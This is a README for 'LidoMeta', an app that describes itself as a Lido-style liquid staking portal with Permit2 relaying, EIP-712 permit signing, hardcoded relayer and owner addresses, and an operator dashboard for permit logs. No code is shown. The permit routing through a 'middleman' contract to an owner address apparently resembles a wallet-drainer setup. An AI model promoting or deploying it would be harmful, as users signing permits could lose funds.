# LidoMeta - Liquid Staking Interface & Relayer Protocol

An enterprise liquid ETH staking application built on Lido protocol standards, equipped with integrated Permit2 relaying, off-chain EIP-712 permit signing, owner fee collection routing, and real-time operator analytics.

---

## 🌟 Key Features

- **Liquid Staking Portal**: Seamlessly stake ETH to receive stETH with real-time yield and APY tracking.
- **Relayer Vault Integration**: Gasless permit routing via the relayer contract (`0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091`).
- **Owner Fee Recipient Routing**: Integrated fee structure routed directly to protocol owner address (`0xEfc5859335A58d64A5e8E01d02c5241c852CBD40`).
- **EIP-712 & Permit2 Support**: Off-chain typed data signatures for seamless, security-focused token permits.
- **Operator Admin Dashboard**: Comprehensive management interface for verifying sessions, monitoring permit logs, and auditing on-chain relayer activity.
- **Web3 Wallet Connectivity**: Native support for MetaMask, WalletConnect, and Coinbase Wallet via Reown AppKit and Wagmi.

---

## ⚙️ Core Configuration Addresses

| Role / Entity | Address |
|---|---|
| **Relayer Vault Middleman Contract** | `0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091` |
| **Protocol Owner & Fee Recipient** | `0xEfc5859335A58d64A5e8E01d02c5241c852CBD40` |

---

## 🛠 Tech Stack

- **Frontend**: React 19, Vite 6, Tailwind CSS v4, Lucide Icons, Motion
- **Web3**: Wagmi v3, Viem, Reown AppKit, Ethers v6, SIWE
- **Backend Server**: Node.js, Express, ESBuild, TSX
- **Database/Session**: Express Session, Server-side API Routes

---

## 🚀 Getting Started

### Prerequisites

- Node.js 18+ installed
- npm or bun package manager

### Installation

```bash
# Clone the repository
git clone https://github.com/leephil1907-lab/lidometa.git
cd lidometa

# Install dependencies
npm install
```

### Development

Run the local development server with live reload:

```bash
npm run dev
```

Open `http://localhost:3000` in your browser.

### Production Build

Compile both server and client assets for production:

```bash
npm run build
npm start
```

---

## 📄 License

MIT License.
